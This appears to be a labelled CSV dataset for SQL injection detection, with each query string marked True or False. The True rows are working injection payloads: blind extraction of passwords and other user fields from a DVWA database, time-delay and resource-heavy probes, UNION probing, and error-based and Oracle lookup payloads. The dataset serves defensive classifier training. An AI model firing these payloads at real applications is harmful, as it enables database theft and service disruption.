Query,SQLIA
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk",True
SELECT purple FROM grabbed UNION SELECT tea FROM careful ORDER BY character,False
"  SELECT * FROM out WHERE equator NOT IN  ( 'pictured', 'visit', 'by' )  ",False
SELECT * FROM difficult ORDER BY neighbor,False
 or 2 > 1,True
DELETE FROM species WHERE monkey = 'somewhere',False
pravia,False
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367581 ) ,False
35200,False
"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",True
flori@casabolsa43.np,False
doa,False
973,False
"  SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",False
1  )   where 1333  =  1333 order by 1--,True
91sc04de9o,False
SELECT * FROM entirely WHERE prevent LIKE '%main%',False
SELECT * FROM place,False
"SELECT customername, contactname FROM customers; CREATE INDEX idx_lastname ON Persons  ( LastName ) ; CREATE INDEX idx_pname ON Persons  ( LastName, FirstName ) ; CREATE UNIQUE INDEX uidx_pid ON Persons  ( PersonID ) ; CREATE VIEW [Brazil Customers] AS ",False
1  )   or pg_sleep  (  __TIME__  )  --,True
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",True
SELECT AVG ( prize )  FROM bad  SELECT SUM ( quarter ) ,False
rothamel,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),16,1))>47 AND 'Tfyt'='Tfyt",True
SELECT AVG ( poet ) FROM spin,False
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),15,1))>24 AND 'hBNb'='hBNb",True
-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616,True
beom-sah,False
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,True
"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",True
"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",True
SELECT team ( s FROM though RIGHT JOIN,False
grandy,False
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31',False
anything' OR 'x'  =  'x,True
"1' union all select null,null,null,null,null,null,null,null--",True
entregadora,False
"   SELECT COUNT ( worry ) , stream FROM shop BY sheet",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>45 AND 'hBNb'='hBNb",True
"pl. san marcos, 0, 11f",False
sedero,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),15,1))>48 AND 'bSNt'='bSNt",True
"   SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperNameFROM     (  (  OrdersINNER JOIN Customers ON Orders.CustomerID  =  Customers.CustomerID )   INNER JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID ) ;",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),3,1))>104 AND 'hbvt'='hbvt",True
boquieni,False
printers,False
DELETE FROM bow,False
es518l132n,False
1'  )   waitfor delay '0:0:5',True
merida@elsentidodelavida.nc,False
"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",True
@variable,True
SELECT * FROM wp_posts WHERE ID  =  262327 LIMIT 1,False
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",True
SELECT option_value FROM wp_options WHERE option_name  =  'classic-editor-replace' LIMIT 1,False
-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,True
"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",True
aristin,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>48 AND 'znpp'='znpp",True
SELECT AVG ( muscle ) FROM dangerous,False
phan,False
"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",True
select   (  case when   (  3325  =  1767  )   then 3325 else 3325*  (  select 3325 from mysql.db  )   end  )  #,True
SELECT COUNT ( depend ) FROM discuss,False
38747118f,False
1'||  (  select 'zoqo' from dual where 2063  =  2063,True
"1""  )   where 4520  =  4520",True
slezak@ballerpoker.kn,False
8586,False
SELECT volume ( s ) FROM field INNER JOIN,False
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),8,1))>96 AND 'epJT'='epJT",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),25,1))>104 AND 'upay'='upay",True
lantarn,False
merkling,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM dvwa.guestbook),2,1))>48 AND 'XdPX'='XdPX",True
9195,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),21,1))>42 AND 'upay'='upay",True
matilla la seca,False
15873,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),26,1))>48 AND 'Tfyt'='Tfyt",True
"1%""   )    )    and 7533  =  7533 and    (    (   ""%""  =  """,True
SELECT * FROM club FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rocket,False
"c/ curadero, 101, 12?e",False
SELECT TOP 3 * FROM say,False
"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",True
"1"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
SELECT * FROM anywhere WHERE stick = 'bit'  AND City = 'mine',False
cesana@lasexta-f1.jm,False
SELECT COUNT ( pick ) FROM guard,False
ugartechea oviol,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>52 AND 'JUqW'='JUqW",True
1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),20,1))>96 AND 'Tfyt'='Tfyt",True
1 and 2006  =  2006,True
16802646l,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),32,1))>55 AND 'TkwJ'='TkwJ",True
SELECT column_name FROM table_name WHERE condition GROUP BY column_name ORDER BY column_name;,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),1,1))>72 AND 'CRxB'='CRxB",True
26222,False
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28313 )  ORDER BY meta_id ASC",False
"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",True
SELECT MIN ( short )  AS frame FROM mirror,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),4,1))>54 AND 'yuzR'='yuzR",True
SELECT * FROM card WHERE library = 'share'  OR himself = 'course',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),5,1))>96 AND 'epJT'='epJT",True
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi",True
-9368%' OR 8910=3424 AND 'NbvM%'='NbvM,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),12,1))>55 AND 'vyMm'='vyMm",True
"1""  )   where 1607  =  1607",True
SELECT * FROM silence 3 SELECT * FROM dozen,False
"1""   )    )    as ecnn where 8913  =  8913 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",True
SELECT * FROM clothing WHERE prove = 'east',False
"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",True
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,True
"  SELECT sentence,imagine,another FROM brass LEFT JOIN Orders ON having.mannerID =  tune.generally ORDER BY snow.discover",False
SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLY,False
1' rlike sleep  (  5  ) ,True
if  (  3831  =  9321  )   select 3831 else drop function ybru--,True
18449,False
"   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) ",False
SELECT * FROM frame WHERE afternoon = 'rest'  AND City = 'bow',False
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",True
"1""  )   as hblk where 7982  =  7982 and 9611  =  6142--",True
"   SELECT remove, per, handFROM consist WHERE twenty  IS NOT NULL",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),2,1))>52 AND 'bSNt'='bSNt",True
t45r97car,False
"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",True
17403,False
genestar llufriu,False
1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',True
otao suaso,False
SELECT * FROM flew FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM airplane,False
37170,False
dean,False
SELECT baseball ( s )  FROM consist FULL OUTER JOIN,False
"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",True
SELECT agree ( s )  FROM shoot SELECT magic FROM statement,False
zael,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),12,1))>47 AND 'yuzR'='yuzR",True
edmunds.emil@carimartin.io,False
SELECT * FROM acres WHERE began = 'who' FETCH FIRST 3 ROWS ONLY,False
"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",True
"1'  )   where 9304  =  9304 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",True
6424,False
9834,False
"1""  )   waitfor delay '0:0:5' and   (  ""vjpg""  =  ""vjpg",True
"c/ costa verde, 100 4c",False
"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",True
" SELECT * FROM review ORDER BY told ASC, worth DESC",False
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",True
"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",True
"c/ hortensia 48,",False
"-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--",True
" SELECT SUBSTRING ( CustomerName, 2, 5 )  AS ExtractString FROM Customers;",False
"1'||  (  select 'dpje' where 2704  =  2704 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",True
DELETE FROM organization,False
margheri,False
"INSERT INTO got  ( buried, human, plural )  VALUES  ( 'steam', 'likely', 'third' )  ",False
SELECT * FROM ago  WHERE noon = blank,False
trombn,False
"1%'   )    )     )   union all select null,null,null,null,null,null,null#",True
"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,True
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",True
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>96 AND 'hBNb'='hBNb",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),2,1))>47 AND 'uBuU'='uBuU",True
c6he5era,False
SELECT stay ( s ) FROM product INNER JOIN,False
SELECT atmosphere ( s FROM thread RIGHT JOIN,False
SELECT COUNT ( DISTINCT command )  FROM return,False
"-7939""  )   or 3958  =  6909",True
SELECT COUNT ( DISTINCT round )  FROM pictured,False
having,True
anamary,False
"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>54 AND 'vyMm'='vyMm",True
SELECT COUNT ( border )  FROM support,False
"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",True
"-1076 union all select 3959,3959--",True
1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',True
SELECT drove,False
"1'+  (  select 'sbvh' where 8539  =  8539 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),4,1))>97 AND 'TkwJ'='TkwJ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>97 AND 'Tfyt'='Tfyt",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),1,1))>53 AND 'TkwJ'='TkwJ",True
"finca el jardinito, 155,",False
1'+  (  select qtyi where 7147  =  7147,True
forcarei,False
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262335 )  ORDER BY meta_id ASC",False
79274775p,False
4089,False
SELECT hill ( s FROM studied RIGHT JOIN,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),7,1))>51 AND 'bSNt'='bSNt",True
sile,False
37159,False
9.00454E+15,False
SELECT COUNT ( pick ) FROM stop,False
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx",True
1 uni/**/on select all from where,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),3,1))>88 AND 'TszS'='TszS",True
bujaraloz,False
"1"" union all select null,null,null,null,null,null,null#",True
"1""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""wvlb"" like ""wvlb",True
60578448j,False
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,True
"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
kwokchoi,False
"plaza del yunque, 4,",False
almoharn,False
"-5507' or elt  (  1032  =  1032,3623  )   and 'ndqw'  =  'ndqw",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),13,1))>51 AND 'JUqW'='JUqW",True
SELECT * FROM tomorrow WHERE Price NOT BETWEEN 10 AND 20,False
SELECT * FROM  ( SELECT serious FROM salt ) ,False
SELECT * FROM glad WHERE source = 'fairly'  OR widely = 'image',False
"  SELECT * FROM examine WHERE hello IN  ( 'shoot', 'happy', 'ball' )  ",False
sadoc,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),16,1))>60 AND 'vyMm'='vyMm",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),12,1))>96 AND 'epJT'='epJT",True
"  SELECT lionID AS ID, mouse AS own FROM stomach",False
"  SELECT smell,perhaps FROM independent WHERE citizen = 'leg' UNION SELECT win, positive FROM deep",False
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'izyf'  =  'izyf,True
"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",True
"  SELECT * FROM cannot WHERE soft IN  ( 'toward', 'harbor', 'cloth' )  ",False
1438,False
zaleska_legon@zampy.so,False
"1""   )    )    union all select null,null,null,null,null,null,null,null#",True
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,True
SELECT MIN ( smile )  AS tree FROM alone,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>50 AND 'CoVr'='CoVr",True
